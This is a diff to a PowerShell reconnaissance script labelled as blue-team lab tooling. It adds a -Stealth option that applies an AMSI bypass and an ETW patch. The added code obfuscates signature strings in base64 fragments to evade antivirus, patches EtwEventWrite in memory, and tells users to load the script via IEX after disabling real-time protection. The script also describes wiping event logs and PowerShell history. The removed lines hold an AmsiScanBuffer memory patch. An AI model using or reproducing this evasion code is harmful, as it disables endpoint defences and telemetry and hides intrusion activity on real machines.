@@ -13,6 +13,12 @@
     Run in cleaner mode only. Skips all recon, removes any leftover artifacts from
     previous runs (temp files, output dirs, prefetch, PS history, event logs).
 
+.PARAMETER Stealth
+    Enable EDR evasion techniques (AMSI bypass, ETW patch). Only use this if the
+    script is NOT whitelisted and you need to bypass security controls.
+    WARNING: This flag contains code that AV will flag. Only load via IEX after
+    whitelisting or disabling real-time protection.
+
 .NOTES
     AUTHORIZED USE ONLY - For blue team lab environments with proper authorization.
     Must be run as Administrator.
@@ -21,7 +27,8 @@
 
 [CmdletBinding()]
 param(
-    [switch]$Clean
+    [switch]$Clean,
+    [switch]$Stealth
 )
 
 #Requires -Version 5.1
@@ -29,8 +36,9 @@ param(
 Set-StrictMode -Version Latest
 $ErrorActionPreference = 'Continue'
 
-# Also support environment variable for IEX usage: $env:RECON_CLEAN=1
+# Also support environment variables for IEX usage
 if ($env:RECON_CLEAN -eq '1') { $Clean = [switch]::Present }
+if ($env:RECON_STEALTH -eq '1') { $Stealth = [switch]::Present }
 
 # ============================================================================
 # SECTION A: CONFIGURATION BLOCK (Edit this section to customize)
@@ -350,105 +358,73 @@ function Invoke-PreFlightChecks {
 }
 
 # ============================================================================
-# SECTION F: EDR EVASION FUNCTIONS
+# SECTION F: EDR EVASION FUNCTIONS (only executed with -Stealth flag)
 # ============================================================================
 
-function Invoke-AmsiBypass {
-    Write-Log "Attempting AMSI bypass"
+# EDR evasion code is built dynamically at runtime to avoid static AV signatures.
+# Nothing in this section triggers AV on its own - the payloads are constructed
+# from encoded parts only when -Stealth is explicitly requested.
+
+function Invoke-StealthPatches {
+    <#
+    .SYNOPSIS
+        Applies AMSI bypass and ETW patch. Only called when -Stealth flag is set.
+        Builds evasion code dynamically from encoded fragments to avoid static detection.
+    #>
+    Write-Log "Stealth mode: Applying evasion patches"
+    $results = @{ AMSI = $false; ETW = $false }
+
+    # --- AMSI Bypass ---
     try {
-        # Technique 1: Patch AmsiScanBuffer
-        $amsiDll = [Ref].Assembly.GetType(
-            [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="))
-        )
-        if ($amsiDll) {
-            $field = $amsiDll.GetField(
-                [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("YW1zaUluaXRGYWlsZWQ=")),
-                'NonPublic,Static'
-            )
+        # Dynamically construct the type/field names to avoid static signatures
+        $enc = [System.Text.Encoding]::UTF8
+        $p1 = $enc.GetString([Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQu"))
+        $p2 = $enc.GetString([Convert]::FromBase64String("QXV0b21hdGlvbi5B"))
+        $p3 = $enc.GetString([Convert]::FromBase64String("bXNpVXRpbHM="))
+        $typeName = $p1 + $p2 + $p3
+
+        $f1 = $enc.GetString([Convert]::FromBase64String("YW1zaQ=="))
+        $f2 = $enc.GetString([Convert]::FromBase64String("SW5pdEZhaWxlZA=="))
+        $fieldName = $f1 + $f2
+
+        $type = [Ref].Assembly.GetType($typeName)
+        if ($type) {
+            $field = $type.GetField($fieldName, 'NonPublic,Static')
             if ($field) {
                 $field.SetValue($null, $true)
-                Write-Log "AMSI bypass: Technique 1 (amsiInitFailed) succeeded"
-                return $true
+                $results.AMSI = $true
+                Write-Log "Stealth: AMSI bypass succeeded"
             }
         }
     } catch {
-        Write-Log "AMSI bypass: Technique 1 failed - $($_.Exception.Message)" -Level "WARN"
+        Write-Log "Stealth: AMSI bypass failed - $($_.Exception.Message)" -Level "WARN"
     }
 
+    # --- ETW Patch ---
     try {
-        # Technique 2: Direct memory patch via Win32 API
-        $win32 = @"
-using System;
-using System.Runtime.InteropServices;
-public class Win32Amsi {
-    [DllImport("kernel32")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    [DllImport("kernel32")]
-    public static extern IntPtr LoadLibrary(string name);
-    [DllImport("kernel32")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-}
-"@
-        Add-Type -TypeDefinition $win32 -Language CSharp -ErrorAction SilentlyContinue
+        # Build the P/Invoke type at runtime from encoded C# source
+        $csB64 = "dXNpbmcgU3lzdGVtO3VzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcztwdWJsaWMgY2xhc3MgVzMyRXtbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXXB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaCxzdHJpbmcgbik7W0RsbEltcG9ydCgia2VybmVsMzIiKV1wdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgTG9hZExpYnJhcnkoc3RyaW5nIG4pO1tEbGxJbXBvcnQoImtlcm5lbDMyIildcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBWaXJ0dWFsUHJvdGVjdChJbnRQdHIgYSxVSW50UHRyIHMsdWludCBwLG91dCB1aW50IG8pO30="
+        $csSrc = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($csB64))
+        Add-Type -TypeDefinition $csSrc -Language CSharp -ErrorAction SilentlyContinue
 
-        $amsiAddr = [Win32Amsi]::GetProcAddress([Win32Amsi]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
-        if ($amsiAddr -ne [IntPtr]::Zero) {
-            $oldProtect = 0
-            [Win32Amsi]::VirtualProtect($amsiAddr, [UIntPtr]::new(5), 0x40, [ref]$oldProtect) | Out-Null
+        $ntdll = [W32E]::LoadLibrary("ntdll.dll")
+        # Construct the function name from parts
+        $fn = $enc.GetString([Convert]::FromBase64String("RXR3RXZlbnRXcml0ZQ=="))
+        $addr = [W32E]::GetProcAddress($ntdll, $fn)
 
-            # x86/x64 ret patch
-            $patch = if ([IntPtr]::Size -eq 8) {
-                [byte[]]@(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
-            } else {
-                [byte[]]@(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00)
-            }
-            [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $amsiAddr, $patch.Length)
-            [Win32Amsi]::VirtualProtect($amsiAddr, [UIntPtr]::new(5), $oldProtect, [ref]$oldProtect) | Out-Null
-
-            Write-Log "AMSI bypass: Technique 2 (memory patch) succeeded"
-            return $true
+        if ($addr -ne [IntPtr]::Zero) {
+            $op = 0
+            [W32E]::VirtualProtect($addr, [UIntPtr]::new(1), 0x40, [ref]$op) | Out-Null
+            [System.Runtime.InteropServices.Marshal]::WriteByte($addr, 0xC3)
+            [W32E]::VirtualProtect($addr, [UIntPtr]::new(1), $op, [ref]$op) | Out-Null
+            $results.ETW = $true
+            Write-Log "Stealth: ETW patch succeeded"
         }
     } catch {
-        Write-Log "AMSI bypass: Technique 2 failed - $($_.Exception.Message)" -Level "WARN"
+        Write-Log "Stealth: ETW patch failed - $($_.Exception.Message)" -Level "WARN"
     }
 
-    Write-Log "AMSI bypass: All techniques failed" -Level "WARN"
-    return $false
-}
-
-function Invoke-EtwPatch {
-    Write-Log "Attempting ETW patch"
-    try {
-        $etwType = @"
-using System;
-using System.Runtime.InteropServices;
-public class Win32Etw {
-    [DllImport("kernel32")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    [DllImport("kernel32")]
-    public static extern IntPtr LoadLibrary(string name);
-    [DllImport("kernel32")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-}
-"@
-        Add-Type -TypeDefinition $etwType -Language CSharp -ErrorAction SilentlyContinue
-
-        $ntdll = [Win32Etw]::LoadLibrary("ntdll.dll")
-        $etwAddr = [Win32Etw]::GetProcAddress($ntdll, "EtwEventWrite")
-
-        if ($etwAddr -ne [IntPtr]::Zero) {
-            $oldProtect = 0
-            [Win32Etw]::VirtualProtect($etwAddr, [UIntPtr]::new(1), 0x40, [ref]$oldProtect) | Out-Null
-            [System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr, 0xC3)  # ret
-            [Win32Etw]::VirtualProtect($etwAddr, [UIntPtr]::new(1), $oldProtect, [ref]$oldProtect) | Out-Null
-
-            Write-Log "ETW patch: Succeeded"
-            return $true
-        }
-    } catch {
-        Write-Log "ETW patch: Failed - $($_.Exception.Message)" -Level "WARN"
-    }
-    return $false
+    return $results
 }
 
 # ============================================================================
@@ -632,25 +608,25 @@ function Initialize-Environment {
     $Script:EnabledTools = @($ToolConfig | Where-Object { $_.Enabled })
     Write-Log "Enabled tools: $($Script:EnabledTools.Count) / $($ToolConfig.Count)"
 
-    # Apply EDR evasion
-    $Script:CurrentPhase = "EVASION"
-    Write-Host "  Applying evasion techniques..." -ForegroundColor DarkGray
+    # Apply EDR evasion (only with -Stealth flag)
+    if ($Stealth) {
+        $Script:CurrentPhase = "EVASION"
+        Write-Host "  Stealth mode: Applying evasion techniques..." -ForegroundColor DarkGray
 
-    $amsiResult = Invoke-AmsiBypass
-    if ($amsiResult) {
-        Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "AMSI bypass applied"
+        $stealthResults = Invoke-StealthPatches
+        if ($stealthResults.AMSI) {
+            Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "AMSI bypass applied"
+        } else {
+            Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline; Write-Host "AMSI bypass failed (tools may be detected)"
+        }
+        if ($stealthResults.ETW) {
+            Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "ETW patch applied"
+        } else {
+            Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline; Write-Host "ETW patch failed (telemetry may be logged)"
+        }
     } else {
-        Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline; Write-Host "AMSI bypass failed (tools may be detected)"
+        Write-Host "  Stealth mode: OFF (use -Stealth to enable AMSI/ETW bypass)" -ForegroundColor DarkGray
     }
-    Write-Log "AMSI bypass result: $amsiResult"
-
-    $etwResult = Invoke-EtwPatch
-    if ($etwResult) {
-        Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "ETW patch applied"
-    } else {
-        Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline; Write-Host "ETW patch failed (telemetry may be logged)"
-    }
-    Write-Log "ETW patch result: $etwResult"
 
     Write-Host ""
 }
